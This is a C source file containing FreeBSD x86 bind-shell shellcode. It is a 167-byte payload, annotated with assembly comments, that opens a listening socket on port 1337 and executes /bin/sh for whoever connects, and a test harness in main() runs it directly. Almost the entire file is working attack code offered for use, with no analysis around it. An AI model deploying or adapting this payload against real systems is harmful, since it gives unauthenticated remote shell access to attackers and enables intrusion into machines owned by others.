/*-
 * Copyright (c) 2009, Sofian Brabez <sbz@6dev.net>
 *
 * freebsd-x86-portbind.c - FreeBSD x86 portbind a shell (/bin/sh) on
1337 (\x05\x39) 167 bytes
 */

const char shellcode[] =
	"\x6a\x00" 					// push   $0x0
	"\x6a\x01" 					// push   $0x1
	"\x6a\x02" 					// push   $0x2
	"\x50" 						// push   %eax
	"\x6a\x61" 					// push   $0x61
	"\x58" 						// pop    %eax
	"\xcd\x80" 					// int    $0x80
	"\x50" 						// push   %eax
	"\x6a\x00" 					// push   $0x0
	"\x6a\x00" 					// push   $0x0
	"\x6a\x00" 					// push   $0x0
	"\x6a\x00" 					// push   $0x0
	"\x68\x10\x02\x05\x39" 		// push   $0x39050210
	"\x89\xe0" 					// mov    %esp,%eax
	"\x6a\x10" 					// push   $0x10
	"\x50" 						// push   %eax
	"\xff\x74\x24\x1c" 			// pushl  0x1c(%esp)
	"\x50" 						// push   %eax
	"\x6a\x68" 					// push   $0x68
	"\x58"						// pop    $eax
	"\xcd\x80" 					// int    $0x80
	"\x6a\x01"					// push   $0x1
	"\xff\x74\x24\x28"			// pushl  0x28(%esp)
	"\x50"						// push   %eax
	"\x6a\x6a"					// push   $0x6a
	"\x58"						// pop    $eax
	"\xcd\x80"					// int    $0x80
	"\x83\xec\x10"				// sub    $0x10,$esp
	"\x6a\x10"					// push   $0x10
	"\x8d\x44\x24\x04"         	// lea    0x4(%esp),%eax
	"\x89\xe1"					// mov    %esp,%ecx
	"\x51"						// push   %ecx
	"\x50"						// push   %eax
	"\xff\x74\x24\x4c"			// pushl  0x4c(%esp)
	"\x50"						// push   %eax
	"\x6a\x1e"					// push   %0x1e
	"\x58"						// pop    %eax
	"\xcd\x80"					// int    $0x80
	"\x50"						// push   %eax
	"\xff\x74\x24\x58"			// pushl  0x58(%esp)
	"\x50"						// push   %eax
	"\x6a\x06"					// push   $0x6
	"\x58"						// pop    %eax
	"\xcd\x80"					// int    $0x80
	"\x6a\x00"					// push   $0x0
	"\xff\x74\x24\x0c"			// pushl  0xc(%esp)
	"\x50"						// push   %eax
	"\x6a\x5a"					// push   $0x5a
	"\x58"						// pop    %eax
	"\xcd\x80"					// int    $0x80
	"\x6a\x01"					// push   $0x1
	"\xff\x74\x24\x18"			// pushl  0x18(%esp)
	"\x50"						// push   %eax
	"\x6a\x5a"					// push   $0x5a
	"\x58"						// pop    %eax
	"\xcd\x80"					// int    $0x80
	"\x6a\x02"					// push   $0x2
	"\xff\x74\x24\x24"			// pushl  0x24(%esp)
	"\x50"						// push   %eax
	"\x6a\x5a"					// push   $0x5a
	"\x58"						// pop    %eax
	"\xcd\x80"					// int    $0x80
	"\x68\x73\x68\x00\x00"		// push   $0x6873
	"\x89\xe0"					// mov    %esp,%eax
	"\x68\x2d\x69\x00\x00"		// push   $0x692d
	"\x89\xe1"					// mov    %esp,%ecx
	"\x6a\x00"					// push   $0x0
	"\x51"						// push   %ecx
	"\x50"						// push   %eax
	"\x68\x2f\x73\x68\x00"		// push   $0x68732f
	"\x68\x2f\x62\x69\x6e"		// push   $0x6e69622f
	"\x89\xe0"					// mov    %esp,%eax
	"\x8d\x4c\x24\x08"			// lea    0x8(%esp),%ecx
	"\x6a\x00"					// push   $0x0
	"\x51"						// push   %ecx
	"\x50"						// push   %eax
	"\x50"						// push   %eax
	"\x6a\x3b"					// push   $0x3b
	"\x58"						// pop    %eax
	"\xcd\x80";					// int    $0x80

int main(void) {
    void (*egg)() = (void *)shellcode;

    return (*(int(*)())shellcode)();
}